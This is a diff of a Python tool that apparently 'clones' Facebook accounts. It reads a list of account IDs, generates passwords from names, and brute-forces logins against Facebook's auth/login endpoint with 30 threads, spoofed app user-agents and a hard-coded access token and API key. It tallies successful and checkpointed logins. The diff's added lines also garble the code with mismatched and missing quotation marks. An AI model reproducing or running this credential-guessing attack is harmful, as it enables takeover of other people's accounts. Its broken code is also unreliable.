@@ -71,7 +71,7 @@ Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, l
 """
 
 ua=[]
-logo = """)
+logo="\x1b[1;39m
 \033[1;39m======================================================
 \033[1;31m    ____   ____   ___    __ __________ ________    
 \033[1;31m    `MM'  6MMMMb  `MM    d'  `MMMMMMMMM `MMMMMMMb.  
@@ -97,7 +97,7 @@ def linex():
 	print('\033[1;39m======================================================')
 def Main():
 	clear()
-	print("\033[1;32m[1] \033[1;37mFILE CLONING")
+	print('\033[1;32m[1] \033[1;37mFILE CLONING")
 	print("\033[1;32m[2] \033[1;33mCONTACT ADMIN")
 	print("\033[1;33m[0]\033[1;33m EXIT");linex()
 	g = input("\033[1;32m[?] \033[1;37mChoose :- ")
@@ -107,9 +107,9 @@ def Main():
 	if g == '2':
 		os.system("xdg-open ");Main()
 	if g =='0':
-		linex();exit("[•] Thanks for using tool \n[•] bye see you again ")
+		linex();exit("'[•] Thanks for using tool \n[•] bye see you again ")
 	else:
-		linex();exit("[•] Thanks for using tool \n[•] bye see you again ")
+		linex();exit("'[•] Thanks for using tool \n[•] bye see you again ")
 		
 
 l = []
@@ -119,7 +119,7 @@ def file():
     if 'gm' in l:
         file = '.Hannan'
     else:
-    	print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/MANI.txt");linex();file = input(f"\033[1;32m[?]\033[1;37m PUT FILE PATH : ")
+    	print('\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/MANI.txt");linex();file = input(f"\033[1;32m[?]\033[1;37m PUT FILE PATH : ")
     try:
         for x in open(file,'r').readlines():
             accounts.append(x.strip())
@@ -174,14 +174,14 @@ def method():
         sys.stdout.write('\r\r\033[1;97m[MANI]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:     
-            heads = "Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
-            heads = "Mozilla/5.0 (Linux; Android 8.1.0; GLi Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
+            heads =Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
+            heads ="Mozilla/5.0 (Linux; Android 8.1.0; GLi Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
             heads = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]"
             heads = "Mozilla/5.0 (Linux; Android 12; Nokia G60 5G Build/SKQ1.220201.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]"
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
-            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":''350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":''882a8490361da98702bf97a021ddc14d"}
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
       #      print(response.text) 
             if 'session_key' in response.text:
@@ -220,6 +220,6 @@ def method():
     else:
        with speed(max_workers=30) as speede:
             speede.map(start, accounts)
-    linex();print("\n\033[1;32m[✓] \033[1;33mYOUR PROCESS HAS BEEN COMPLETED");linex();input("\033[1;32m[✓] \033[1;31mPRESS ENTER TO BACK ");Main()
+    linex();print('\n\033[1;32m[✓] \033[1;33mYOUR PROCESS HAS BEEN COMPLETED");linex();input("\033[1;32m[✓] \033[1;31mPRESS ENTER TO BACK ");Main()
       
 Main()
